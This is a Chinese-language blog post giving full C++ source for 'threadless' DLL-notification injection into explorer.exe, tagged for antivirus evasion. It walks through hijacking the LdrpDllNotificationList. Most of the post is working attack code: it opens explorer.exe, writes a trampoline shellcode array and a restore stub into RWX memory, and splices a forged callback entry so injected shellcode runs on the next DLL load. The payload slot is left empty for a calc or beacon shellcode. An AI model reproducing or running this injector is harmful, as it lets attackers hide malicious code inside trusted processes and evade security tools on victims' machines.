---
layout: post
title: DllNotification Inject 
categories: Inject
description: Inject 之 DLL通知
keywords: Windows，注入，免杀
---

# DllNotification Inject

通过DLL通知“无线程”注入**Explorer.exe**，也可以注入**RuntimeBroker.exe**，要求是需要包含**Library**和**Load 的**函数。

## DllNotificationInjection.cpp

```c++
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "nt.h"

// 查找进程,返回PID
int FindTarget(const char* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    printf("[+] Remote PID: %i\n", pid);
    return pid;
}

// 查找特定的占位符 ，目前使用的是  "\x11\x11\x11\x11\x11\x11\x11\x11"
BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

// 虚拟回调函数
VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
{
    return;
}

// 获取LdrpDllNotificationList头地址  LIST_ENTRYP -> LDR_DLL_NOTIFICATION_ENTRY
PLIST_ENTRY GetDllNotificationListHead() {
    PLIST_ENTRY head = 0;
    LDR_DLL_NOTIFICATION_ENTRY;
    // 获取ntdll的句柄
    HMODULE hNtdll = GetModuleHandleA("NTDLL.dll");

    if (hNtdll != NULL) {

        // 找到LdrRegisterDllNotification函数       
        _LdrRegisterDllNotification pLdrRegisterDllNotification = (_LdrRegisterDllNotification)GetProcAddress(hNtdll, "LdrRegisterDllNotification");//在首次加载 DLL 时注册通知

        // 找到LdrUnregisterDllNotification函数
        _LdrUnregisterDllNotification pLdrUnregisterDllNotification = (_LdrUnregisterDllNotification)GetProcAddress(hNtdll, "LdrUnregisterDllNotification");

        // 将我们的虚拟回调函数注册为 DLL 通知回调
        PVOID cookie;
        NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)DummyCallback, NULL, &cookie);
        if (status == 0) {
            printf("[+] Successfully registered dummy callback\n");

            // Cookie 是最后注册的回调，因此其 Flink 持有列表的头部。
            head = ((PLDR_DLL_NOTIFICATION_ENTRY)cookie)->List.Flink;
            printf("[+] Found LdrpDllNotificationList head: 0x%p\n", head);

            // 取消注册我们的虚拟回调函数
            status = pLdrUnregisterDllNotification(cookie);
            if (status == 0) {
                printf("[+] Successfully unregistered dummy callback\n");
            }
        }
    }

    return head;
}

// 打印远程进程的LdrpDllNotificationList
void PrintDllNotificationList(HANDLE hProc, LPVOID remoteHeadAddress) {
    printf("\n");
    printf("[+] 远程 DLL 通知阻止列表:\n");

    // 为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区   被准备一个空的表，准备插入原本的链表。
    BYTE* entry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));

    //从远程进程读取首个链表
    ReadProcessMemory(hProc, remoteHeadAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);  

    LPVOID currentEntryAddress = remoteHeadAddress;
    do {
        
        // 打印 LDR_DLL_NOTIFICATION_ENTRY 及其回调函数的地址
        printf("    0x%p -> 0x%p\n", currentEntryAddress, ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->Callback);

        // 获取列表中下一个回调的地址    直接读取了地址在远程地方读取。
        currentEntryAddress = ((PLDR_DLL_NOTIFICATION_ENTRY)entry)->List.Flink;

        // 读取列表中的下一个回调
        ReadProcessMemory(hProc, currentEntryAddress, entry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);

    } while ((PLIST_ENTRY)currentEntryAddress != remoteHeadAddress); // 当我们再次到达列表的头部时停止

    free(entry);

    printf("\n");
}

unsigned char shellcode[] = 
"";

unsigned char restore[] = {
    0x41, 0x56,														// push r14
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,		// move r14, 0x1122334455667788     将原来的Flink地址移动到寄存器R14
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,						// mov dword [r14], 0x11223344      将原本的Flink前四字节移动到r14
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11, 				// mov dword [r14+4], 0x11223344    将原本的Flink后四字节移动到r14+4上
    0x49, 0xBE, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,		// move r14, 0x1122334455667788     将原来的Blink地址移动到寄存器R14
    0x41, 0xC7, 0x06, 0x44, 0x33, 0x22, 0x11,						// mov dword [r14], 0x11223344      将原本的Blink前四字节移动到r14
    0x41, 0xC7, 0x46, 0x04, 0x44, 0x33, 0x22, 0x11, 				// mov dword [r14+4], 0x11223344    将原本的Blink后四字节移动到r14+4上
    0x41, 0x5e,														// pop r14                          将r14寄存器恢复
};

// 用于为恢复序言和恶意 shellcode 创建 TpAllocWork 的 Trampoline shellcode
unsigned char trampoline[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xf, 0x0, 0x0, 0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x55, 0xb9, 0xf0, 0x1d, 0xd3, 0xad, 0x41, 0x54, 0x57, 0x56, 0x53, 0x31, 0xdb, 0x48, 0x83, 0xec, 0x30, 0xe8, 0xf9, 0x0, 0x0, 0x0, 0xb9, 0x53, 0x17, 0xe6, 0x70, 0x49, 0x89, 0xc5, 0xe8, 0xec, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0x4d, 0x85, 0xed, 0x74, 0x10, 0xba, 0xda, 0xb3, 0xf1, 0xd, 0x4c, 0x89, 0xe9, 0xe8, 0x28, 0x1, 0x0, 0x0, 0x48, 0x89, 0xc3, 0x4d, 0x85, 0xe4, 0x74, 0x32, 0x4c, 0x89, 0xe1, 0xba, 0x37, 0x8c, 0xc5, 0x3f, 0xe8, 0x13, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0xb2, 0x5a, 0x91, 0x4d, 0x48, 0x89, 0xc7, 0xe8, 0x3, 0x1, 0x0, 0x0, 0x4c, 0x89, 0xe1, 0xba, 0x4d, 0xff, 0xa9, 0x27, 0x48, 0x89, 0xc6, 0xe8, 0xf3, 0x0, 0x0, 0x0, 0x49, 0x89, 0xc4, 0xeb, 0x7, 0x45, 0x31, 0xe4, 0x31, 0xf6, 0x31, 0xff, 0x45, 0x31, 0xc9, 0x45, 0x31, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0xba, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x48, 0xc7, 0x44, 0x24, 0x28, 0x0, 0x0, 0x0, 0x0, 0xff, 0xd7, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0xff, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x41, 0xff, 0xd4, 0xba, 0x0, 0x10, 0x0, 0x0, 0x48, 0x83, 0xc9, 0xff, 0xff, 0xd3, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0x5e, 0x5f, 0x41, 0x5c, 0x41, 0x5d, 0xc3, 0x49, 0x89, 0xd1, 0x49, 0x89, 0xc8, 0xba, 0x5, 0x15, 0x0, 0x0, 0x8a, 0x1, 0x4d, 0x85, 0xc9, 0x75, 0x6, 0x84, 0xc0, 0x75, 0x16, 0xeb, 0x2f, 0x41, 0x89, 0xca, 0x45, 0x29, 0xc2, 0x4d, 0x39, 0xca, 0x73, 0x24, 0x84, 0xc0, 0x75, 0x5, 0x48, 0xff, 0xc1, 0xeb, 0x7, 0x3c, 0x60, 0x76, 0x3, 0x83, 0xe8, 0x20, 0x41, 0x89, 0xd2, 0xf, 0xb6, 0xc0, 0x48, 0xff, 0xc1, 0x41, 0xc1, 0xe2, 0x5, 0x44, 0x1, 0xd0, 0x1, 0xc2, 0xeb, 0xc4, 0x89, 0xd0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x48, 0x89, 0xce, 0x53, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x20, 0x48, 0x89, 0xfb, 0xf, 0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89, 0xc0, 0x48, 0x39, 0xf0, 0x75, 0x6, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11, 0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x74, 0x5, 0x48, 0x39, 0xdf, 0x75, 0xd9, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd6, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xed, 0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x28, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc, 0x8, 0x88, 0x0, 0x0, 0x0, 0x48, 0x1, 0xcf, 0x44, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0x67, 0x1c, 0x44, 0x8b, 0x6f, 0x24, 0x49, 0x1, 0xcf, 0x39, 0x6f, 0x18, 0x76, 0x31, 0x89, 0xee, 0x31, 0xd2, 0x41, 0x8b, 0xc, 0xb7, 0x48, 0x1, 0xd9, 0xe8, 0x15, 0xff, 0xff, 0xff, 0x4c, 0x39, 0xf0, 0x75, 0x18, 0x48, 0x1, 0xf6, 0x48, 0x1, 0xde, 0x42, 0xf, 0xb7, 0x4, 0x2e, 0x48, 0x8d, 0x4, 0x83, 0x42, 0x8b, 0x4, 0x20, 0x48, 0x1, 0xd8, 0xeb, 0x4, 0xff, 0xc5, 0xeb, 0xca, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x83, 0xe8, 0x5, 0xc3, 0xf, 0x1f, 0x44, 0x0 };

int main()
{
    // 获取本地LdrpDllNotificationList头地址   从cookie中找到首个表 双路链表 LIST_ENTRY 
    LPVOID headAddress = (LPVOID)GetDllNotificationListHead();
    printf("[+] LdrpDllNotificationList  address: 0x%p\n", headAddress);

    // 打开远程进程的句柄
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindTarget("explorer.exe"));
    printf("[+] Got handle to remote process\n");

    // 打印远程Dll通知列表
    PrintDllNotificationList(hProc, headAddress);

    //---2. 将 calc.exe 弹窗的shellcode 的地址写入 trampoline ，由
    // 在远程进程中为我们的蹦床+恢复链表的shellcode+上线shellcode分配内存
    LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(restore)+ sizeof(trampoline) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] 为远程进程中恢复蹦床+序言+shellcode分配的内存\n");
    printf("[+] 远程进程中的 Trampoline 地址: 0x%p\n", trampolineEx);

    // 偏移trampoline的大小以获得恢复序言地址  跳板地址
    LPVOID restoreEx = (BYTE*)trampolineEx + sizeof(trampoline); //恢复链表的shellcode  restore是恢复链表的shellcode
    printf("[+] 恢复远程进程中的序言地址: 0x%p\n", restoreEx);

    // 偏移trampoline的大小并恢复序言以获取shellcode地址
    LPVOID shellcodeEx = (BYTE*)trampolineEx + sizeof(trampoline) + sizeof(restore);    //Shellcode是弹窗
    printf("[+] 远程进程中的Shellcode地址: 0x%p\n", shellcodeEx);


    // 在trampoline shellcode中找到我们的restoreEx占位符
    LPVOID restoreExInTrampoline = (LPVOID)FindPattern((DWORD_PTR)&trampoline, sizeof(trampoline), (PBYTE)"\x11\x11\x11\x11\x11\x11\x11\x11", (PCHAR)"xxxxxxxx");

    // 用我们的恢复序言的地址覆盖我们的restoreEx占位符
    memcpy(restoreExInTrampoline, &restoreEx, 8);         //将运行恢复原本链表的shellcode 地址写入运行shellcode的模板

    // 将 运行calc.exe的shellcode写入远程进程
    WriteProcessMemory(hProc, trampolineEx, trampoline, sizeof(trampoline), nullptr);          //写入注册
    printf("[+] trampoline has been written to remote process: 0x%p\n", trampolineEx);

    // 将shellcode写入远程进程
    WriteProcessMemory(hProc, shellcodeEx, shellcode, sizeof(shellcode), nullptr);             //写入解除链表的shellcode写入运行的shellcode
    printf("[+] Shellcode has been written to remote process: 0x%p\n", shellcodeEx);
    //--- shellcode 结构 |shellcode运行序言 |  空  | calc Shellcode        --- 注意这里运行的是恢复目标链表的

    //--- 3.创建我们新的表
    //创建一个新的LDR_DLL_NOTIFICATION_ENTRY  准备插入链表
    LDR_DLL_NOTIFICATION_ENTRY newEntry = {};
    newEntry.Context = NULL;

    // 设置 Callback 属性指向我们的蹦床
    newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)trampolineEx;           //指向我们组合的shellcode  首先会运行shellcode 模板，shellcode模板会运行恢复原本链表的shellcode，指挥才会运行calc的shellcode。

    //------  设置目标程序中的链表
    // 我们希望我们的新条目成为列表中的第一个
    // 所以它的List.Blink属性应该指向列表的头部
    newEntry.List.Blink = (PLIST_ENTRY)headAddress;                             //指向上一个连接
    
    //------ 获取目标的第一个LDR_DLL_NOTIFICATION_ENRTY 备份
    //为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区
    BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));  //分配大小

    //从远程进程读取头条目
    ReadProcessMemory(hProc, headAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);    //获取目标未变动第一个链表

    // 将新条目的 List.Flink 属性设置为指向列表中原始的第一个条目
    newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;                       //将第一个链表的下一个执行的改为我的表的下一个

    //------ 在目标进程申请新的表为我们的新条目分配内存
    LPVOID newEntryAddress = VirtualAllocEx(hProc, 0, sizeof(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory for new entry in remote process: 0x%p\n", newEntryAddress);

    //将我们DIY的LDR_DLL_NOTIFICATION_ENTRY写入远程进程                                                                            //
    WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &newEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
    printf("[+] New entry has been written to remote process: 0x%p\n", newEntryAddress);
    //---3.结束   修改我们的表和在目标申请一个表的结束

    //---4.修改目标链表 修改目标Flink和Blink的地址
    // 计算我们需要用新条目的地址覆盖的地址
    // 上一个条目的 Flink（头）和下一个条目的 Blink（原始第 1 个条目）
    LPVOID previousEntryFlink = (LPVOID)((BYTE*)headAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));                                           //原来首个表的FFLINK
    LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));//原来首个表的BLINK

    // 我们要覆盖的原始值的缓冲区
    unsigned char originalValue[8] = {};

    //------ 将修复模块的shellcode 里面硬编码更改。
    // 读取前一个条目的Flink（头）的原始值
    ReadProcessMemory(hProc, previousEntryFlink, &originalValue, 8, nullptr);       //这个八字节是Flink指向的地址   00 00 7f fe df 07 66 30  注意是小端的数据需要反过来读
    memcpy(&restore[4], &previousEntryFlink, 8); // 设置要恢复的地址以恢复上一个条目的Flink（头）   // move r14, 0x1122334455667788   将地址覆盖进去
    memcpy(&restore[15], &originalValue[0], 4); //  设置要恢复的值（值的第一半）                    // mov dword [r14], 0x11223344    下面两个是覆盖Flink的地址
    memcpy(&restore[23], &originalValue[4], 4); //  设置要恢复的值（值的第二半）                    // mov dword [r14+4], 0x11223344

    // 读取下一个条目的 Blink 的原始值（原始第一个条目）
    ReadProcessMemory(hProc, nextEntryBlink, &originalValue, 8, nullptr);
    memcpy(&restore[29], &nextEntryBlink, 8); //   设置要恢复的地址以用于下一个条目的闪烁（原始第一个条目） // move r14, 0x1122334455667788
    memcpy(&restore[40], &originalValue[0], 4); // 设置要恢复的值（值的第一半）                       // mov dword [r14], 0x11223344
    memcpy(&restore[48], &originalValue[4], 4); // 设置要恢复的值（值的第二半）                       // mov dword [r14+4], 0x11223344

    //--- shellcode 结构 |shellcode运行序言 |  修复原本链表的shellcode  | calc Shellcode 

    // 将恢复链表的序言写入远程进程  
    WriteProcessMemory(hProc, restoreEx, restore, sizeof(restore), nullptr);
    printf("[+] Restore prologue has been written to remote process: 0x%p\n", restoreEx);


    /// --- 将链表的首个表的上一个指向和下一个指向 全部指向shellcode
    // 用新条目的地址覆盖前一个条目的 Flink（头）
    WriteProcessMemory(hProc, previousEntryFlink, &newEntryAddress, 8, nullptr);        //覆盖原本链表的上一个节点

    // 用新条目的地址覆盖下一个条目的 Blink（原始第一个条目）
    WriteProcessMemory(hProc, nextEntryBlink, &newEntryAddress, 8, nullptr);            //覆盖原本链表的下一个节点

    printf("[+] LdrpDllNotificationList has been modified.\n");
    printf("[+] Our new entry has been inserted.\n");

    // 打印远程Dll通知列表
    PrintDllNotificationList(hProc, headAddress);
}
```

## nt.h

```c++
#pragma once
#include <windows.h>

//redefine UNICODE_STR struct
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

//redefine PEB_LDR_DATA struct
typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//redefine PEB_FREE_BLOCK struct
typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

//redefine PEB struct
typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    _PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;
typedef PROCESS_BASIC_INFORMATION* PPROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG           Flags;             // Reserved.
    PUNICODE_STR FullDllName;       // The full path name of the DLL module.
    PUNICODE_STR BaseDllName;       // The base file name of the DLL module.
    PVOID           DllBase;           // A pointer to the base address for the DLL in memory.
    ULONG           SizeOfImage;       // The size of the DLL image, in bytes.
} LDR_DLL_LOADED_NOTIFICATION_DATA, * PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA {
    ULONG           Flags;             // Reserved.
    PUNICODE_STR FullDllName;       // The full path name of the DLL module.
    PUNICODE_STR BaseDllName;       // The base file name of the DLL module.
    PVOID           DllBase;           // A pointer to the base address for the DLL in memory.
    ULONG           SizeOfImage;       // The size of the DLL image, in bytes.
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, * PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA   Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, * PLDR_DLL_NOTIFICATION_DATA;

typedef VOID(CALLBACK* PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG                       NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA  NotificationData,
    PVOID                       Context);

typedef struct _LDR_DLL_NOTIFICATION_ENTRY {
    LIST_ENTRY                     List;
    PLDR_DLL_NOTIFICATION_FUNCTION Callback;
    PVOID                          Context;
} LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;

typedef NTSTATUS(NTAPI* _LdrRegisterDllNotification) (
    ULONG                          Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    PVOID                          Context,
    PVOID* Cookie);

typedef NTSTATUS(NTAPI* _LdrUnregisterDllNotification)(PVOID Cookie);

typedef NTSTATUS(NTAPI* NtQueryInformationProcess)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
```

一旦远程进程中创建或销毁了线程，Windows Loader 将遍历 PEB 并调用每个 DLL 的入口点。这样我们的 shellcode 就会被执行。

> 博客：https://shorsec.io/blog/dll-notification-injection/

